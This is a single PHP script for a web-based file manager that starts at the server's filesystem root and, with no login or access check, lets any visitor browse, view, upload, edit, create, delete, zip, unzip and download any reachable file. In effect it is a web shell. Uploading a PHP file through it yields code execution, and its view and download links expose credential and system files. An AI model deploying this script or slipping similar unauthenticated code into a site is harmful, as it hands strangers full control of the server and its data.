<?php
// PHP File Manager with access to the entire filesystem, including upload, file creation, folder creation, editing, deleting, zipping, unzipping, and downloading

// Get the requested directory or default to the root directory
$currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : '/';

// Ensure the directory exists
if ($currentDir === false || !is_dir($currentDir)) {
    die("<div style='color: red;'>Invalid directory.</div>");
}

// Handle file uploading
if (isset($_FILES['upload_file'])) {
    $uploadPath = $currentDir . '/' . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $uploadPath)) {
        echo "<div style='color: green;'>File uploaded successfully.</div>";
    } else {
        echo "<div style='color: red;'>Failed to upload file.</div>";
    }
}

// Handle file creation
if (isset($_POST['create_file']) && isset($_POST['new_file_name'])) {
    $newFilePath = $currentDir . '/' . basename($_POST['new_file_name']);
    if (!file_exists($newFilePath)) {
        file_put_contents($newFilePath, "");
        echo "<div style='color: green;'>File created successfully.</div>";
    } else {
        echo "<div style='color: red;'>File already exists.</div>";
    }
}

// Handle folder creation
if (isset($_POST['create_folder']) && isset($_POST['new_folder_name'])) {
    $newFolderPath = $currentDir . '/' . basename($_POST['new_folder_name']);
    if (!file_exists($newFolderPath)) {
        mkdir($newFolderPath);
        echo "<div style='color: green;'>Folder created successfully.</div>";
    } else {
        echo "<div style='color: red;'>Folder already exists.</div>";
    }
}

// Handle file editing
if (isset($_POST['edit_file']) && isset($_POST['content'])) {
    $fileToEdit = realpath($_POST['edit_file']);
    if ($fileToEdit !== false && is_writable($fileToEdit)) {
        file_put_contents($fileToEdit, $_POST['content']);
        echo "<div style='color: green;'>File saved successfully.</div>";
        echo "<a href='?dir=" . urlencode(dirname($fileToEdit)) . "'>Back</a>";
        exit;
    } else {
        echo "<div style='color: red;'>Unable to edit file. Check permissions.</div>";
    }
}

// Handle file viewing
if (isset($_GET['view_file'])) {
    $fileToView = realpath($_GET['view_file']);
    if ($fileToView !== false && is_file($fileToView)) {
        echo "<h2 style='background: #333; color: white; padding: 10px;'>Viewing File: " . htmlspecialchars($fileToView) . "</h2>";
        echo "<pre style='background: #f4f4f4; padding: 10px; border: 1px solid #ccc;'>" . htmlspecialchars(file_get_contents($fileToView)) . "</pre>";
        echo "<a href='?dir=" . urlencode(dirname($fileToView)) . "'>Back</a>";
        exit;
    } else {
        echo "<div style='color: red;'>Invalid file path.</div>";
    }
}

// Handle file deletion
if (isset($_GET['delete_file'])) {
    $fileToDelete = realpath($_GET['delete_file']);
    if ($fileToDelete !== false && is_file($fileToDelete) && is_writable($fileToDelete)) {
        unlink($fileToDelete);
        echo "<div style='color: green;'>File deleted successfully.</div>";
        echo "<a href='?dir=" . urlencode(dirname($fileToDelete)) . "'>Back</a>";
        exit;
    } else {
        echo "<div style='color: red;'>Unable to delete file. Check permissions.</div>";
    }
}

// Handle zipping
if (isset($_POST['zip_folder']) && isset($_POST['zip_name'])) {
    $zipPath = $currentDir . '/' . basename($_POST['zip_name']) . '.zip';
    $zip = new ZipArchive();
    if ($zip->open($zipPath, ZipArchive::CREATE) === TRUE) {
        $folderToZip = realpath($_POST['zip_folder']);
        if ($folderToZip && is_dir($folderToZip)) {
            $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folderToZip));
            foreach ($iterator as $file) {
                if (!$file->isDir()) {
                    $zip->addFile($file->getPathname(), substr($file->getPathname(), strlen($folderToZip) + 1));
                }
            }
        }
        $zip->close();
        echo "<div style='color: green;'>Folder zipped successfully.</div>";
    } else {
        echo "<div style='color: red;'>Failed to create zip file.</div>";
    }
}

// Handle unzipping
if (isset($_POST['unzip_file'])) {
    $zipPath = realpath($_POST['unzip_file']);
    if ($zipPath && is_file($zipPath)) {
        $unzipPath = $currentDir . '/' . pathinfo($zipPath, PATHINFO_FILENAME);
        $zip = new ZipArchive();
        if ($zip->open($zipPath) === TRUE) {
            $zip->extractTo($unzipPath);
            $zip->close();
            echo "<div style='color: green;'>File unzipped successfully.</div>";
        } else {
            echo "<div style='color: red;'>Failed to unzip file.</div>";
        }
    } else {
        echo "<div style='color: red;'>Invalid zip file path.</div>";
    }
}

// Handle file download
if (isset($_GET['download_file'])) {
    $fileToDownload = realpath($_GET['download_file']);
    if ($fileToDownload !== false && is_file($fileToDownload)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($fileToDownload) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($fileToDownload));
        readfile($fileToDownload);
        exit;
    } else {
        echo "<div style='color: red;'>Invalid file path.</div>";
    }
}

// List files and directories
$items = scandir($currentDir);
echo "<h1 style='background: #333; color: white; padding: 10px;'>Directory: " . htmlspecialchars($currentDir) . "</h1>";
echo "<a style='margin-bottom: 20px; display: inline-block; background: #007BFF; color: white; padding: 10px; text-decoration: none;' href='?dir=" . urlencode(__DIR__) . "'>Home</a><br><br>";

// File operations (Upload, Create File, Create Folder, Zip, Unzip) as a single responsive horizontal layer
echo "<div style='display: flex; flex-wrap: wrap; gap: 20px; align-items: flex-start; background: #f9f9f9; padding: 10px; border: 1px solid #ccc;'>";

// Upload form
echo "<div style='flex: 1; min-width: 200px;'><h2 style='margin-bottom: 10px;'>Upload File</h2>
      <form method='post' enctype='multipart/form-data'>
          <input type='file' name='upload_file' style='margin-bottom: 5px;'>
          <button type='submit'>Upload</button>
      </form></div>";

// Create file form
echo "<div style='flex: 1; min-width: 200px;'><h2 style='margin-bottom: 10px;'>Create New File</h2>
      <form method='post'>
          <input type='text' name='new_file_name' placeholder='Enter new file name' style='margin-bottom: 5px;'>
          <button type='submit' name='create_file'>Create File</button>
      </form></div>";

// Create folder form
echo "<div style='flex: 1; min-width: 200px;'><h2 style='margin-bottom: 10px;'>Create New Folder</h2>
      <form method='post'>
          <input type='text' name='new_folder_name' placeholder='Enter new folder name' style='margin-bottom: 5px;'>
          <button type='submit' name='create_folder'>Create Folder</button>
      </form></div>";

// Zip form
echo "<div style='flex: 1; min-width: 200px;'><h2 style='margin-bottom: 10px;'>Zip Folder</h2>
      <form method='post'>
          <input type='text' name='zip_folder' placeholder='Enter folder path' style='margin-bottom: 5px;'>
          <input type='text' name='zip_name' placeholder='Enter zip name' style='margin-bottom: 5px;'>
          <button type='submit'>Zip</button>
      </form></div>";

// Unzip form
echo "<div style='flex: 1; min-width: 200px;'><h2 style='margin-bottom: 10px;'>Unzip File</h2>
      <form method='post'>
          <input type='text' name='unzip_file' placeholder='Enter zip file path' style='margin-bottom: 5px;'>
          <button type='submit'>Unzip</button>
      </form></div>";

echo "</div><br>";

echo "<ul style='list-style: none; padding: 0;'>";
foreach ($items as $item) {
    $path = $currentDir . '/' . $item;
    if ($item === '.') {
        continue;
    }
    if ($item === '..') {
        $parentDir = dirname($currentDir);
        echo "<li><a href='?dir=" . urlencode($parentDir) . "' style='text-decoration: none; color: #007BFF;'>.. (Up)</a></li>";
        continue;
    }
    if (is_dir($path)) {
        echo "<li><a href='?dir=" . urlencode($path) . "' style='text-decoration: none; color: #007BFF;'>" . htmlspecialchars($item) . "/</a></li>";
    } elseif (is_file($path)) {
        echo "<li style='margin-bottom: 5px;'>" . htmlspecialchars($item) . 
             " [<a href='?view_file=" . urlencode($path) . "' style='text-decoration: none; color: green;'>View</a>] " .
             "[<a href='?edit_file=" . urlencode($path) . "' style='text-decoration: none; color: orange;'>Edit</a>] " .
             "[<a href='?delete_file=" . urlencode($path) . "' onclick=\"return confirm('Are you sure you want to delete this file?');\" style='text-decoration: none; color: red;'>Delete</a>] " .
             "[<a href='?download_file=" . urlencode($path) . "' style='text-decoration: none; color: blue;'>Download</a>]</li>";
    }
}
echo "</ul>";

// File editing form
if (isset($_GET['edit_file'])) {
    $fileToEdit = realpath($_GET['edit_file']);
    if ($fileToEdit !== false && is_file($fileToEdit) && is_writable($fileToEdit)) {
        $content = htmlspecialchars(file_get_contents($fileToEdit));
        echo "<h2 style='background: #333; color: white; padding: 10px;'>Editing File: " . htmlspecialchars($fileToEdit) . "</h2>";
        echo "<form method='post'>
                <input type='hidden' name='edit_file' value='" . htmlspecialchars($fileToEdit) . "'>
                <textarea name='content' rows='20' cols='100' style='width: 100%; padding: 10px; border: 1px solid #ccc;'>" . $content . "</textarea><br>
                <button type='submit' style='margin-top: 10px;'>Save</button>
              </form>";
        echo "<a href='?dir=" . urlencode(dirname($fileToEdit)) . "' style='text-decoration: none; color: #007BFF;'>Back</a>";
    } else {
        echo "<div style='color: red;'>Unable to edit file. Check permissions.</div>";
    }
}
?>
